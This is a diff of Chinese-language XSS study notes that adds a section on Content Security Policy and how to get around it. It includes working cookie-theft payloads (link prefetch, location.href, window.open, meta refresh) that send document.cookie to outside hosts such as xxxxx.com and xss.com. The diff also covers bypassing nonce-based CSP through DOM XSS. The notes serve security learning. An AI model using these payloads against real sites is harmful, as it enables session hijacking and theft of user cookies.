@@ -14,7 +14,7 @@ Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內
   
 *  [XSS detection](#xss-detection)  
 *  [常見限制 and 對抗手勢](#常見限制-and-對抗手勢)  
-*  [CSP介紹與繞過](#csp-into-and-bypass)  
+*  [CSP介紹與繞過](#csp-intro-and-bypass)  
 *  [正規表達式](#正規表達式)  
 *  [攻擊手勢](#攻擊手勢)  
 *  [popunder彈窗手勢](#彈窗手勢)  
@@ -84,8 +84,8 @@ alert(/1/);">
   這部分內容有點多，我還是獨立出來筆記好了:sweat:
 
 # CSP Intro and bypass
-從瀏覽器的層面來防禦漏洞  
-主要有兩種 1.限制`js`執行 2. 限制對別的域的請求  
+從瀏覽器的層面來防禦漏洞[Content Security Policy Level 3](https://www.w3.org/TR/CSP/)  
+主要有兩種 1. 限制`js`執行 2. 限制對別的域的請求  
 怎麼看一個網站的CSP呢？  
 ```php
 curl -I https://github.com/
@@ -94,6 +94,73 @@ curl -I https://github.com/
 // 並且也能看到CSP的內容
 Content-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; connect-src 'self' uploads.github.com status.github.com collector.githubapp.com api.github.com www.google-analytics.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com wss://live.github.com; font-src assets-cdn.github.com; form-action 'self' github.com gist.github.com; frame-ancestors 'none'; frame-src render.githubusercontent.com; img-src 'self' data: assets-cdn.github.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com *.githubusercontent.com; manifest-src 'self'; media-src 'none'; script-src assets-cdn.github.com; style-src 'unsafe-inline' assets-cdn.github.com
 ```
+現在開始解讀CSP  
+```php
+header("Content-Security-Policy: default-src 'self '; script-src * ");
+```
+以上CSP歡迎您加載任何domain的js :-1: ，此外會禁止加載domain外的source
+```php
+header("Content-Security-Policy: default-src 'self'; script-src 'self' ");
+```
+以上CSP只能讓您加載當前domain下的js，尋找後台上傳內容為js的圖片或文件，`src=upload/1pwnch.js`
+```php
+header(" Content-Security-Policy: default-src 'self '; script-src http://localhost/static/ ");
+```
+以上CSP只能加載特定資料夾下的js，這時候可以尋找`static/`下有沒有可控的跳轉文件(302)，我們可以把這個文件當作跳板去加載我們上傳的js文件  
+實際上，CSP無法阻止的事情可多著，如果開發者的代碼直接截取使用者輸入作為js執行，CSP也會變得毫無意義，或者是用`jsonp`來進行跨域的請求  
+來看看最常見的CSP  
+```php
+header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ");
+```
+`unsage-inline`指頁面中直接添加的`<script>`可以被執行，再來便是繞過domain的限制：  
+  1. 用js製造link prefetch  
+     [什麼是prefetch](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Link_prefetching_FAQ)  
+     ```js
+     // 只有chrome可用  
+     var x = document.createElement("link");
+     x.setAttribute("rel", "prefetch");
+     x.setAttribute("href", "//xxxxx.com/?" + document.cookie);
+     document.head.appendChild(x);
+     ```
+  2. 跳轉 && 跨域  
+     ```js
+     <script>location.href=http://lorexxar.cn?a+document.cookie</script>
+     <script>windows.open(http://lorexxar.cn?a=+document.cooke)</script>
+     <meta http-equiv="refresh" content="5;http://lorexxar.cn?c=[cookie]">
+     // 
+     var x = document.createElement("x");
+     x.href='http://xss.com/?cookie='+escape(document.cookie);
+     x.click();
+     ```  
+* nonce script CSP  
+  這是在CSP2出現的概念，Web應用會根據一個隨機token來判斷腳本是否可信任  
+  ```php
+  header("Content-Security-Policy: default-src 'self'; script-src 'nonce-{隨機}' ");
+  ```
+  以上CSP只有帶一樣nonce`<script nonce="{隨機}">alert(1)</script>`的script才可以執行  
+  但是要**繞過**也很簡單，這個`隨機`字符串基本上是每次request都會重新產生(一次性)  
+  ```php
+  // 假設header裡面是類似 nonce-".$random." 在後端產生
+  <script nonce="<?php echo $random ?>">
+  ```  
+  **Sebastian Lekies** 提出**DOM XSS**可以完虐nonce script CSP  
+  [How to bypass CSP nonces with DOM XSS 🎅](http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html)  
+  諸如`location.hash`操作的xss攻擊，根本不需要經過後台，那nonce的值也不會刷新  
+* strict-dynamic  
+  這是在CSP3中新規範的一種參數，為了現代各式各樣的框架而提出  
+  ```php
+  script-src 'nonce-random' 'strict-dynamic'; object-src 'none'
+  ```
+  這樣一行CSP就可以確保所有**靜態**的`script`有匹配的nonce，strict-dynamic可以幫助開發人員在web運行過程中動態加載受信任的腳本  
+  **Script Gadgets**[security-research-pocs by Google](https://github.com/google/security-research-pocs/tree/master/script-gadgets)  
+
+以web開發人員的角度推薦幾個工具：  
+1. [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
+2. [ChromePlugin-CSP Mitigator](https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa)  
+
+以上筆記很大部分取自[LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
+非常推薦閱讀原文
+
 
 # 正規表達式
 js中會用正規表達式來過濾危險字符  
@@ -137,7 +204,7 @@ js中會用正規表達式來過濾危險字符
 <button data-toggle="collapse" data-target="<?=htmlspecialchars($_GET['x']);?>">Test</button>
 // 雖然有參數可控但是htmlspecialchar轉義，這本該是安全的，但是會在bootstrap環境下data-target的屬性中觸發
 ```
-值得注意的是`data-target`本身不會造成xss漏洞，而是被帶到boostrap的環境下發揮效用的！  
+值得注意的是`data-target`本身不會造成xss漏洞，而是被帶到boostrap的環境下發揮效用的！  
 [XSS in data-target attribute #20184](https://github.com/twbs/bootstrap/issues/20184)  
 * Vue.js
 
@@ -187,3 +254,5 @@ atob.constructor(unescape([...escape((𐑬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄽󠄧�
 5. [freebuf](http://www.freebuf.com/articles/web/153055.html)  
 6. [BruteXSS](https://github.com/shawarkhanethicalhacker/BruteXSS)  
 7. [PayloadAllTheThings by swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)  
+8. [LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
+9. [通过严格的内容安全策略（CSP）重塑Web防御体系 by 安全客](https://www.anquanke.com/post/id/84655)
